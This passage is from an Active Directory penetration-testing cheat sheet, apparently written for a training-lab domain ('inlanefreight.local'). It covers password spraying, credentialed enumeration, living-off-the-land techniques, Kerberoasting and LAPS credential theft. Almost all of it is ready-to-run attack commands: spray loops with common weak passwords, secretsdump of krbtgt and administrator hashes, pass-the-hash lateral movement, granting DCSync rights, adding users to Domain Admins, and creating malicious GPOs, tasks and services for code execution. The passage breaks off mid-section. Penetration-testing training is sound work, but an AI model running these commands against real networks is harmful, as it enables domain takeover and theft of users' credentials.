## 6.1 - Pre-Spray Filter — Avoid Near-Lockout Accounts

```bash
# BadPwdCount tracks failed attempts
netexec smb 172.16.5.5 -u user -p 'pass' --users | grep "badpwdcount: 0" > users_clean.txt
# Or, with PowerView
Get-DomainUser -LDAPFilter "(badpwdcount=0)" -Properties samaccountname,badpwdcount | select samaccountname,badpwdcount
```

## 6.2 - Spray from Linux

```bash
# Kerbrute (preferred — Kerberos pre-auth, generates 4768 not 4625)
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 users_clean.txt 'Welcome1' -v

# Custom users file
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 users_clean.txt 'Spring2025!' -v

# Multiple passwords (one per round)
for pw in 'Welcome1' 'Password1' 'Company1!' 'Spring2025!' 'Fall2025!'; do
  kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 users_clean.txt "$pw" -v
  sleep 3600  # wait 1 hour between
done

# CrackMapExec
netexec smb 172.16.5.5 -u users_clean.txt -p 'Welcome1' | grep +
# —local-auth for local accounts on hosts (not domain)

# rpcclient one-liner
for u in $(cat users_clean.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 2>/dev/null | grep -i Authority
done

# windapsearch + CME combo
# 1. Get all users via windapsearch -U
# 2. Spray with CME
```

## 6.3 - Spray from Windows

```powershell
# DomainPasswordSpray.ps1 (preferred — auto-filters badpwdcount, auto-detects domain)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success.txt -ErrorAction SilentlyContinue

# Verbose (shows attempts as they happen)
Invoke-DomainPasswordSpray -Password Welcome1 -Verbose

# With custom user list
Invoke-DomainPasswordSpray -Password Welcome1 -UserList users_clean.txt

# Specific OU
Invoke-DomainPasswordSpray -Password Welcome1 -Domain inlanefreight.local -OU "OU=ServiceAccounts,DC=inlanefreight,DC=local"

# Kerbrute from Windows
.\kerbrute.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 users_clean.txt 'Welcome1'

# Manual spray with PowerShell
# (loop through users, attempt LDAP bind with creds)
$users = Get-Content users_clean.txt
foreach ($u in $users) {
  $secpwd = ConvertTo-SecureString "Welcome1" -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential("$u", $secpwd)
  try {
    Get-ADUser -Identity $u -Credential $cred -ErrorAction Stop | Out-Null
    Write-Host "PWNED: $u"
  } catch { }
}
```

## 6.4 - Common Password Patterns to Try
```
Seasonal + Year:    Spring2025!, Summer2025!, Fall2025!, Winter2025!
Welcome/Company:    Welcome1, Welcome123, Company1!, Corp123
Standard weak:      Password1, Password123, P@ssw0rd, Passw0rd1
Reversed:           1emocleW (some attackers try both ways)
Company domain:     Inlanefreight1, Inlanefreight2025!
Local football:     Liverpool1FC, LFC1, etc.
Username variations:  <user>1, <user>123, <user>2025!
Breach-based:       most-common-from-Dehashed
```

## 6.5 - Spray Decision Tree
```
Spray round 1 (Welcome1):
├── Got hits → Validate, then immediately use creds (Phase 7)
├── No hits → Wait 1 hour
├── Got locked accounts (4625 events) → Back off
└── Hit 4625 storm → Defensive: stop, switch to other attacks

Spray round 2 (Password1):
└── ...

Spray round 3 (Company1!):
└── ...

(Stop after 4-5 rounds — diminishing returns)
```

---

# PHASE 7: CREDENTIALED ENUMERATION (Linux)

> **Prerequisite:** Valid domain creds (cleartext, NTLM hash, or SYSTEM on domain-joined host)

## 7.1 - CrackMapExec / NetExec (Swiss Army Knife)

```bash
# User enumeration (with badpwdcount)
netexec smb 172.16.5.5 -u user -p 'pass' --users
# Show PwdLastSet, LastLogon, badpwdcount

# Group enumeration
netexec smb 172.16.5.5 -u user -p 'pass' --groups
# Just names
netexec smb 172.16.5.5 -u user -p 'pass' --groups | awk '{print $NF}'

# Shares (check READ/WRITE)
netexec smb 172.16.5.5 -u user -p 'pass' --shares
# Read access = READ, Write access = WRITE
# Filter writable:
netexec smb 172.16.5.5 -u user -p 'pass' --shares | grep WRITE

# Share recursion (spider for files)
netexec smb 172.16.5.5 -u user -p 'pass' -M spider_plus --share 'Department Shares'
# Output: *_SPIDER_PLUS/<timestamp>.json

# Logged-on users (who has session on which host)
netexec smb 172.16.5.0/24 -u user -p 'pass' --loggedon-users
# DA session = game over

# Password policy
netexec smb 172.16.5.5 -u user -p 'pass' --pass-pol

# RID brute (find more users)
netexec smb 172.16.5.5 -u user -p 'pass' --rid-brute

# Local auth spray (find machines where user is local admin)
netexec smb 172.16.5.0/24 -u user -p 'pass' --local-auth

# Pass-the-Hash
netexec smb 172.16.5.5 -u user -H <nt_hash>

# Modules
netexec smb 172.16.5.5 -u user -p 'pass' -M enum_av
netexec smb 172.16.5.5 -u user -p 'pass' -M ms17-010

# LDAP via CME
netexec ldap 172.16.5.5 -u user -p 'pass' --users
netexec ldap 172.16.5.5 -u user -p 'pass' --groups
netexec ldap 172.16.5.5 -u user -p 'pass' --get-sid
```

## 7.2 - SMBMap (file-level enumeration)

```bash
# Check access on a target
smbmap -u user -p 'pass' -d inlanefreight.local -H 172.16.5.5

# Recursive listing
smbmap -u user -p 'pass' -d inlanefreight.local -H 172.16.5.5 -R 'Department Shares' --dir-only

# File content search
smbmap -u user -p 'pass' -d inlanefreight.local -H 172.16.5.5 -R 'Department Shares' -A '(password|passwd|pwd|backup|cred|secret)'

# List only
smbmap -H 172.16.5.5 -u user -p 'pass'

# Download
smbmap -H 172.16.5.5 -u user -p 'pass' -R 'Department Shares' -A 'creds' -q
```

## 7.3 - rpcclient (Authenticated)

```bash
rpcclient -U 'user%pass' 172.16.5.5
rpcclient $> enumdomusers
rpcclient $> queryuser 0x457        # By RID
rpcclient $> querygroup 0x200       # Domain Users
rpcclient $> querygroupmem 0x200    # Group members
rpcclient $> querydispinfo
rpcclient $> enumdomgroups
rpcclient $> queryal
rpcclient $> lsaquery
rpcclient $> lookupsids <sid>       # SID → name
rpcclient $> lookupnames <user>     # name → SID
```

## 7.4 - ldapsearch (Authenticated)

```bash
# Full dump
ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(objectclass=*)" > all.txt

# Just users with description (often has passwords)
ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(objectclass=user)" description sAMAccountName | grep -B 2 -A 1 "description:"

# Find interesting ACLs
ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(objectclass=user)" ntSecurityDescriptor | grep -A 10 "D:"

# SPN accounts (Kerberoast targets)
ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(&(objectclass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# AS-REP roastable
ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Passwd_notreqd
ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" sAMAccountName
```

## 7.5 - windapsearch

```bash
# Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u user@inlanefreight.local -p 'pass' --da

# Privileged users (recursive nested group membership)
python3 windapsearch.py --dc-ip 172.16.5.5 -u user@inlanefreight.local -p 'pass' -PU

# All users
python3 windapsearch.py --dc-ip 172.16.5.5 -u user@inlanefreight.local -p 'pass' -U

# All groups with members
python3 windapsearch.py --dc-ip 172.16.5.5 -u user@inlanefreight.local -p 'pass' -G

# All computers
python3 windapsearch.py --dc-ip 172.16.5.5 -u user@inlanefreight.local -p 'pass' -C

# Subnets
python3 windapsearch.py --dc-ip 172.16.5.5 -u user@inlanefreight.local -p 'pass' -s
```

## 7.6 - BloodHound.py (Linux Collector)

```bash
# Install (one-time)
sudo neo4j start
# Open browser, set neo4j/neo4j password
bloodhound &  # login

# Run collection (all methods)
sudo bloodhound-python -u 'user@inlanefreight.local' -p 'pass' -ns 172.16.5.5 -d inlanefreight.local -c All
# Output: timestamp_computers.json, timestamp_groups.json, timestamp_users.json, timestamp_domains.json

# Specific collection (stealth)
bloodhound-python -u 'user' -p 'pass' -ns 172.16.5.5 -d inlanefreight.local -c DCOnly

# Auth method: Kerberos
bloodhound-python -k -no-pass -dc 172.16.5.5 -d inlanefreight.local -c All
# Or with ccache
KRB5CCNAME=admin.ccache bloodhound-python -k -no-pass -dc 172.16.5.5 -d inlanefreight.local -c All

# Zip and upload
zip -r bh_data.zip *.json
# In BloodHound GUI: Upload Data → select zip
# Analysis tab: pre-built queries
```

### BloodHound Custom Queries (Source-Verified Useful)
```
- Find Shortest Paths to Domain Admins
- Find Computers where Domain Users are Local Admin
- Find All Domain Admins
- List all Domain Admins
- Find all Domain Controllers
- Find Principals with DCSync Privileges
- Find All Kerberoastable Accounts
- Find All AS-REP Roastable Accounts
- Shortest Paths from Owned Principals
- Shortest Paths to Unconstrained Delegation Systems
- Shortest Paths from Domain Users to High Value Targets
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find All Foreign Domain Group Memberships
- Find All Outbound Trust Relationships
- Find Users with Foreign Domain Group Membership
- Find All Users Trusted for Kerberos Delegation
- Find All Computers with Unconstrained Delegation
- Find All Computers with Constrained Delegation
- Find All Computers with RBCD
- Find All GPOs that grant Interesting Rights
- Find Interesting ACLs (GenericAll/GenericWrite/WriteDACL/WriteOwner)
- Find Users with Description containing "password" or "pass"
- Find Computers with LAPS enabled
- Find all GPOs that modify security group
```

## 7.7 - Impacket Toolkit (Linux)

```bash
# Get all TGT/TGS (if Kerberos)
getTGT.py inlanefreight.local/user:'pass' -dc-ip 172.16.5.5

# AS-REP Roast authenticated (find more users)
impacket-GetNPUsers inlanefreight.local/user:'pass' -request -format hashcat -dc-ip 172.16.5.5 -usersfile more_users.txt

# Kerberoast authenticated
impacket-GetUserSPNs inlanefreight.local/user:'pass' -dc-ip 172.16.5.5 -request -format hashcat -outputfile kerb.hash

# Secretsdump (NTDS.dit, SAM, LSA, cached creds)
secretsdump.py inlanefreight.local/user:'pass'@172.16.5.5
secretsdump.py inlanefreight.local/user:'pass'@172.16.5.5 -just-dc-user krbtgt
secretsdump.py inlanefreight.local/user:'pass'@172.16.5.5 -just-dc-user administrator
secretsdump.py -k -no-pass inlanefreight.local/user@DC01.INLANEFREIGHT.LOCAL  # Kerberos auth

# Lateral movement
psexec.py inlanefreight.local/user:'pass'@172.16.5.25
wmiexec.py inlanefreight.local/user:'pass'@172.16.5.25
smbexec.py inlanefreight.local/user:'pass'@172.16.5.25
atexec.py inlanefreight.local/user:'pass'@172.16.5.25 'whoami /all'
dcomexec.py inlanefreight.local/user:'pass'@172.16.5.25
# Pass-the-Hash
psexec.py -hashes :<nt_hash> inlanefreight.local/user@172.16.5.25

# Kerberos PtH
psexec.py -k -no-pass inlanefreight.local/user@DC01.INLANEFREIGHT.LOCAL

# Coercion (for relay chains)
coercer.py coerce -l <attacker_ip> -t 172.16.5.5 --always-continue

# mssqlclient
mssqlclient.py inlanefreight.local/user:'pass'@172.16.5.5 -windows-auth

# nbtscan
nbtscan 172.16.5.0/24

# lookupsid
lookupsid.py inlanefreight.local/user:'pass'@172.16.5.5
# ADCS enumeration
certipy find -u user@inlanefreight.local -p 'pass' -dc-ip 172.16.5.5 -stdout
certipy find -u user@inlanefreight.local -p 'pass' -dc-ip 172.16.5.5 -vulnerable -stdout
```

## 7.8 - Secretsdump Output (parse)
```bash
# Extract NTLM hashes from secretsdump output
secretsdump.py inlanefreight.local/user:'pass'@172.16.5.5 | tee secretsdump.txt
# Format: <rid>:<sid>lmhash:nthash:::
# Example:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Just-domain-controller (for DA account hashes)
secretsdump.py inlanefreight.local/user:'pass'@172.16.5.5 -just-dc-user administrator
secretsdump.py inlanefreight.local/user:'pass'@172.16.5.5 -just-dc-user krbtgt
# -just-dc-user <user> returns single user's hash
# -just-dc returns all domain hashes (very loud)
```

---

# PHASE 8: CREDENTIALED ENUMERATION (Windows)

## 8.1 - ActiveDirectory PowerShell Module (Built-in)

```powershell
Import-Module ActiveDirectory

# Domain info
Get-ADDomain
Get-ADDomainController -Discover
Get-ADForest
Get-ADTrust -Filter *              # All trust relationships
Get-ADForestDomain
Get-ADGroup -Server <child_dc>     # Cross-domain query

# Users
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity <user> -Properties *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADUser -Filter 'userAccountControl -band 4194304' -Properties userAccountControl  # DONT_REQ_PREAUTH
Get-ADUser -Filter 'userAccountControl -band 32' -Properties userAccountControl       # PASSWD_NOTREQD
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl      # ENCRYPTED_TEXT_PWD_ALLOWED
Get-ADUser -Filter * -Properties passwordlastset, lastlogondate
Get-ADUser -LDAPFilter "(&(...))" -Properties *

# Groups
Get-ADGroup -Filter * | select name
Get-ADGroupMember -Identity "Domain Admins"
Get-ADGroupMember -Identity "Enterprise Admins"
Get-ADGroupMember -Identity "Schema Admins"
Get-ADGroupMember -Identity "Administrators"

# Computers
Get-ADComputer -Filter *
Get-ADComputer -Filter {OperatingSystem -like "*Server*"} -Properties OperatingSystem
Get-ADComputer -Filter {ServicePrincipalName -ne "$null"} -Properties *  # SPN hosts
Get-ADComputer -Filter * -Properties TrustedForDelegation  # Unconstrained delegation

# OUs, GPOs
Get-ADOrganizationalUnit -Filter *
Get-GPO -All

# ACL enumeration
Get-Acl "AD:\CN=Administrator,CN=Users,DC=inlanefreight,DC=local" | Format-List
(Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local").Access

# Reachable hosts (force a connection via AD)
Get-ADDomainController -Discover -Service PrimaryDC

# FSMO roles
Get-ADDomainController -Filter * | ForEach-Object {$_.OperationMasterRoles}
```

## 8.2 - PowerView (PowerShell — the canonical AD enum tool)

```powershell
Import-Module .\PowerView.ps1

# Basic
Get-Domain
Get-DomainController
Get-DomainController -Domain inlanefreight.local
Get-DomainController -Domain logistics.inlanefreight.local
Get-DomainUser
Get-DomainUser -Identity <user>
Get-DomainUser -Properties samaccountname,description
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Get-DomainUser -PreauthNotRequired -Properties samaccountname
Get-DomainUser -LDAPFilter "(description=*pass*)" -Properties samaccountname,description
Get-DomainComputer
Get-DomainComputer -Unconstrained -Properties samaccountname,useraccountcontrol
Get-DomainComputer -TrustedToAuth -Properties *  # Constrained delegation
Get-DomainComputer -LAPS -Properties *
Get-DomainGroup
Get-DomainGroup *admin*
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainForeignGroupMember -Domain inlanefreight.local
Get-DomainUser -LDAPFilter "(memberof=*)" -Properties distinguishedname

# ACLs
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "inlanefreight\\wley"}
$sid = Convert-NameToSid "Domain Admins"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -ResolveGUIDs -Identity "DC01"  # Object-specific ACL

# Local admin check
Test-AdminAccess -ComputerName <target>
Find-LocalAdminAccess -Verbose  # Sprays domain
Invoke-CheckLocalAdminAccess -ComputerName <target>

# Sessions / logons
Get-NetSession -ComputerName <dc> -Verbose
Get-LoggedOnLocal -ComputerName <target>
Get-LoggedOnLocal -ComputerName <target> -Verbose
Get-LastLoggedOn -ComputerName <target>
Get-CachedRDPConnection -ComputerName <target>
Get-NetRDPSession -ComputerName <target>

# Shares
Find-DomainShare -CheckShareAccess
Find-DomainFile -SearchTerms "password" -Domain inlanefreight.local
Find-DomainFile -SearchTerms "pass" "cred" "secret" -Domain inlanefreight.local

# GPO
Get-DomainGPO
Get-DomainGPO -Identity "{31B2F340-016D-11D2-945F-00C04FB984F9}"
Get-DomainGPOLocalGroup  # Restricted groups
$gpo = Get-DomainGPO -Identity "..."
Get-DomainObjectAcl -SearchBase $gpo.DistinguishedName -ResolveGUIDs
Get-DomainOU -GUID <guid>
Get-NetGPO -ComputerName <target>

# Trust
Get-DomainTrust
Get-DomainTrust -Domain inlanefreight.local
Get-DomainTrustMapping
Get-ForestTrust
Get-DomainForeignUser
Get-DomainForeignGroupMember

# Local group (via GPO restricted groups)
Get-NetGPOGroup

# Kerberoast
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName | select samaccountname,ServicePrincipalName
# Or use
Invoke-Kerberoast -OutputFormat hashcat

# AS-REP
Get-DomainUser -PreauthNotRequired -Properties samaccountname

# ACL abuse helpers (PowerView ACL modules)
Add-DomainGroupMember -Identity "Administrators" -Members "wley" -Verbose
Set-DomainObject -Identity <user> -Set @{"serviceprincipalname"="..."}
Set-DomainObject -Identity <user> -Clear "serviceprincipalname"
Set-DomainObjectDNString -Identity <user> -DNString "serviceprincipalname" -Value "..."
# Targeted Kerberoast via SPN write
Set-DomainObject -Identity <user> -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# GenericAll / WriteDACL abuse
Add-DomainGroupMember -Identity "Domain Admins" -Members "evil_user" -Verbose
Set-DomainObject -Identity "DC01" -Set @{"msds-allowedtodelegateto"="..."}  # RBCD on DC
Add-DomainObjectAcl -TargetIdentity "DC01" -PrincipalIdentity "evil_user$" -Rights "All"
# Cleanup (remove added ACL)
Remove-DomainObjectAcl -TargetIdentity "DC01" -PrincipalIdentity "evil_user$" -Rights "All"

# DCSync rights grant
Add-DomainObjectAcl -TargetIdentity "DC01" -PrincipalIdentity "evil_user" -Rights "DCSync" -Verbose
# Or
Add-DomainObjectAcl -TargetIdentity "DC=inlanefreight,DC=local" -PrincipalIdentity "evil_user" -Rights "DS-Replication-Get-Changes","DS-Replication-Get-Changes-All"

# LAPS
Get-DomainComputer | ?{$_.ms-mcs-admpwd} | select samaccountname,ms-mcs-admpwd
Get-DomainComputer -LDAPFilter "(ms-mcs-admpwd=*)" -Properties ms-mcs-admpwd,ms-mcs-admpwdexpiration

# Constrained delegation
Get-DomainComputer -TrustedToAuth -Properties *  # Constrained
# Machine account → SPN set, then abuse
Set-DomainObject -Identity "DC01" -Set @{"msds-allowedtodelegateto"="ldap/DC01.inlanefreight.local"}

# GPO edit (for code execution on members)
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=inlanefreight,DC=local"
Set-GPO -Name "Evil GPO" -Context Computer -SystemSecurityDescriptor $evilSD
# SharpGPOAbuse is more featureful
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Evil" --Author "Admin" --Command "cmd.exe" --Arguments "/c powershell..." --GPOName "Evil GPO"
```

## 8.3 - SharpView (PowerView ported to C#)

```cmd
# Run on a host without loading PowerView
.\SharpView.exe Get-Domain
.\SharpView.exe Get-DomainUser -Identity administrator
.\SharpView.exe Get-DomainUser -SPN
.\SharpView.exe Get-DomainUser -PreauthNotRequired
.\SharpView.exe Get-DomainGroupMember "Domain Admins"
.\SharpView.exe Find-InterestingDomainAcl -ResolveGUIDs
.\SharpView.exe Get-DomainComputer -Unconstrained
.\SharpView.exe Get-DomainGPO
.\SharpView.exe Get-DomainTrust
.\SharpView.exe Get-NetSession
```

## 8.4 - ADExplorer (Sysinternals — GUI snapshot)

```cmd
# Connect with creds, save snapshot, view offline
ADExplorer.exe /accepteula
# File → Connect → dc.inlanefreight.local
# Browse AD tree
# View object properties including security descriptor
# Take snapshot: File → Snapshot → save .dat file
# View snapshot offline (no creds needed)
ADExplorer.exe
# File → Open Snapshot → select .dat
```

## 8.5 - SharpHound / BloodHound (Windows Collector)

```cmd
# Collection with all methods
.\SharpHound.exe -c All -d inlanefreight.local --DomainController 172.16.5.5
# Or with current session (Kerberos)
.\SharpHound.exe -c All --current

# Stealth options
.\SharpHound.exe -c Session,LoggedOn -d inlanefreight.local
# Note: Session collection requires local admin on target hosts

# StealL local admin first
runas /netonly /user:INLANEFREIGHT\admin cmd
# Or use SharpHound with --stealth
.\SharpHound.exe -c SessionLoop --stealth
# Output: <timestamp>_BloodHound.zip
# Upload to BloodHound GUI
```

## 8.6 - Snaffler (Share/email content hunter)

```cmd
# Hunt for credentials in shares
.\Snaffler.exe -d inlanefreight.local -s -o snaffler.log -v data
# -s = SMB only
# -o = log file
# -v = verbosity (data shows what was found)
# Run from a domain-joined host with creds

# Specific shares
.\Snaffler.exe -d inlanefreight.local -s \\FILESERVER\Finance

# Domain-wide
.\Snaffler.exe -d inlanefreight.local -s --users 'all'

# Pre-config file for targeted hunt
```

## 8.7 - ADRecon (Reporting tool — also useful for enumeration)

```powershell
# Full AD report
.\ADRecon.ps1 -DomainController 172.16.5.5 -Credential (Get-Credential)
# Output: ADRecon-Report-<timestamp>.zip with CSV/JSON/HTML reports

# Forest report (incl. trusts)
.\ADRecon.ps1 -DomainController 172.16.5.5 -Forest -Credential (Get-Credential)
```

---

# PHASE 9: LIVING OFF THE LAND

> **Trigger:** EDR/AV blocking tools, restricted PowerShell, AppLocker in place.

## 9.1 - PowerShell Downgrade Attack

```powershell
# PowerShell v2 has no AMSI, no logging, no constrained language mode
# If installed (rare on modern), use it
powershell.exe -Version 2 -Command "Import-Module PowerView; Get-Domain"

# Detection: 400/410 events (PowerShell version logging)
```

## 9.2 - Built-in Windows Enumeration (no tools)

```cmd
# Users
net user /domain
net user <user> /domain  # Detail
wmic useraccount get name,sid
wmic /node:<target> useraccount get name,sid

# Groups
net group /domain
net group "Domain Admins" /domain
net localgroup "Administrators"
net localgroup "Remote Desktop Users"
net localgroup "Distributed COM Users"  # DCOM users (potentially exploitable)

# Computers
net view /domain
net view \\<target>
nltest /dclist:<domain>           # List DCs
nltest /dsgetdc:<domain>          # Get DC info
nltest /domain_trusts             # Trust list

# Shares (per host)
net view \\<target> /all
net share                        # Local shares
net session                      # Active sessions
net use                          # Mapped drives

# Service accounts with SPNs
setspn -T <domain> -Q */*        # All SPNs (Kerberoast targets)

# AD from cmd
dsquery user
dsquery user -name <user> *
dsquery group
dsquery group -name "Domain Admins" | dsget group -members
dsquery computer
dsquery computer -inactive 12   # Inactive 12 weeks
dsquery subnet
dsquery site
dsquery server
dsquery server -hasfsmo schema  # Schema master
dsquery * "DC=inlanefreight,DC=local" -filter "(objectclass=user)" -attr sAMAccountName description

# AD from PowerShell
[adsisearcher]"(&(objectclass=user))".FindAll()

# DNS records (adidnsdump equivalent)
nslookup -type=any <name> <dc>
```

## 9.3 - WMI Enumeration

```cmd
# Local
wmic process get name,processid
wmic service get name,startname
wmic startup get caption,command
wmic useraccount get name,sid
wmic logicaldisk get caption,size,freespace

# Remote
wmic /user:admin /password:pass /node:172.16.5.25 process list brief
wmic /node:172.16.5.25 computersystem get username,domain

# PowerShell WMI
Get-WmiObject -Class Win32_Process -ComputerName <target> -Credential <cred>
Get-WmiObject -Class Win32_Service -ComputerName <target> -Credential <cred>
```

## 9.4 - SharpHound-style Enumeration via Native

```powershell
# Get domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# LDAP query (no tools)
$searcher = [adsisearcher]"(objectclass=user)"
$searcher.Filter = "(&(objectclass=user)(memberof=CN=Domain Admins,*))"
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }
```

## 9.5 - Wmic, sc, reg, schtasks, etc.

```cmd
# Schedule a task for code execution
schtasks /create /s <target> /u admin /p pass /tn "Evil" /tr "C:\Windows\System32\cmd.exe /c calc" /sc once /st 00:00

# Run command
schtasks /run /s <target> /u admin /p pass /tn "Evil"

# Read registry remotely
reg query \\<target>\HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Service creation
sc \\<target> create "Evil" binPath= "C:\evil.exe" start= auto
sc \\<target> start "Evil"
```

---

# PHASE 10: KERBEROASTING

> **Trigger:** Service accounts (and sometimes user accounts) have SPNs. TGS-REQ returns a ticket encrypted with the account's NTLM hash. Crack offline.

## 10.1 - Find SPN Accounts

### Linux
```bash
# Impacket
impacket-GetUserSPNs inlanefreight.local/user:'pass' -dc-ip 172.16.5.5
# Output: SPN, account, last password change, delegation rights

# ldapsearch
ldapsearch -h 172.16.5.5 -D 'user@inlanefreight.local' -w 'pass' -b "DC=inlanefreight,DC=local" -s sub "(&(objectclass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

### Windows
```powershell
# AD module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet

# PowerView
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,passwordlastset | select samaccountname,serviceprincipalname

# setspn
setspn -T inlanefreight.local -Q */*

# Rubeus (also shows interesting accounts)
.\Rubeus.exe kerberoast
```

## 10.2 - Request TGS and Crack

### Linux — Impacket GetUserSPNs
```bash
# Request all TGS
impacket-GetUserSPNs inlanefreight.local/user:'pass' -dc-ip 172.16.5.5 -request -format hashcat -outputfile kerb.hash

# Single user
impacket-GetUserSPNs inlanefreight.local/user:'pass' -dc-ip 172.16.5.5 -request-user 'svc_user' -format hashcat -outputfile kerb_single.hash

# Save in john format
impacket-GetUserSPNs inlanefreight.local/user:'pass' -dc-ip 172.16.5.5 -request -outputfile kerb.john

# Crack with hashcat (RC4 = mode 13100)
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
# AES (less common) = mode 19700
hashcat -m 19700 kerb.hash /usr/share/wordlists/rockyou.txt
# Use rules for complex passwords
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
```

### Windows — Rubeus
```cmd
# Request all (one hash per user)
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt /format:hashcat

# Request specific user
.\Rubeus.exe kerberoast /user:svc_user /outfile:kerb_single.txt /format:hashcat

# Statistics mode (use creds, no requests)
.\Rubeus.exe kerberoast /stats

# Without creds (uses current session) - only works if current user is domain
.\Rubeus.exe kerberoast

# Decrypt TGS-REP (TGS-REQ without TGT-REQ)
.\Rubeus.exe kerberoast /spn:ServiceClass/target.domain.local
```

## 10.3 - Targeted Kerberoasting (Write SPN)

> **Trigger:** Have GenericAll/GenericWrite over a user without SPN. We can set an SPN, request a TGS, then revert the SPN.

### PowerView
```powershell
# 1. Set SPN (assuming GenericAll/GenericWrite on victim)
Set-DomainObject -Identity <victim_user> -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# 2. Kerberoast
Invoke-Kerberoast -Identity <victim_user> -OutputFormat hashcat

# 3. Remove SPN
Set-DomainObject -Identity <victim_user> -Clear serviceprincipalname
```

### Linux (no PowerView)
```bash
# Use ldapmodify
cat > set_spn.ldif << EOF
dn: CN=<victim_user>,OU=ServiceAccounts,DC=inlanefreight,DC=local
changetype: modify
add: servicePrincipalName
servicePrincipalName: nonexistent/BLAHBLAH
EOF

ldapmodify -H ldap://172.16.5.5 -D 'admin@inlanefreight.local' -w 'pass' -f set_spn.ldif

# Then kerberoast
impacket-GetUserSPNs inlanefreight.local/admin:'pass' -dc-ip 172.16.5.5 -request-user <victim_user> -format hashcat -outputfile kerb_targeted.hash

# Cleanup
cat > remove_spn.ldif << EOF
dn: CN=<victim_user>,OU=ServiceAccounts,DC=inlanefreight,DC=local
changetype: modify
delete: servicePrincipalName
servicePrincipalName: nonexistent/BLAHBLAH
EOF

ldapmodify -H ldap://172.16.5.5 -D 'admin@inlanefreight.local' -w 'pass' -f remove_spn.ldif
```

## 10.4 - AS-REP Roasting (Authenticated)

> **Trigger:** Same as unauth, but now we have creds and can dump all UAC flags.

```bash
# Linux — Impacket
impacket-GetNPUsers inlanefreight.local/user:'pass' -dc-ip 172.16.5.5 -request -format hashcat -usersfile users.txt
# Without -request: just list DONT_REQ_PREAUTH users

# Windows — Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# /users: filter to specific users

# PowerView
Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol | select samaccountname
Invoke-ASREPRoast  # request hashes
```

```bash
# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## 10.5 - Kerberoast Decision Tree
```
Kerberoast result:
├── Got TGS-REP for RC4-HMAC (etype 23) → hashcat -m 13100
├── Got TGS-REP for AES-128 (etype 17) → hashcat -m 19700
├── Got TGS-REP for AES-256 (etype 18) → hashcat -m 19700 (or 19800)
├── Cracked → use creds (Phase 7+)
├── Not cracked → try with rules, larger wordlist, common patterns
└── No SPNs found → skip (move to other attacks)
```

---

# PHASE 11: CREDENTIAL THEFT

> **Multiple vectors — exhaustive list from source.**

## 11.1 - LAPS (Local Admin Password Solution)

```powershell
# Find LAPS-managed computers
Get-DomainComputer -LDAPFilter "(ms-mcs-admpwd=*)" -Properties ms-mcs-admpwd,ms-mcs-admpwdexpiration

# Get LAPS password (need Read on ms-Mcs-AdmPwd)
Get-DomainComputer -Identity <target> -Properties ms-mcs-admpwd

# LAPSToolkit (PowerView-aware)
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
Find-LAPSDelegatedGroups
# Show who can read LAPS
Get-LAPSComputers | ForEach-Object { $_.Computer, $_.Delegated }
```

```bash
# Linux
# Read LAPS via LDAP
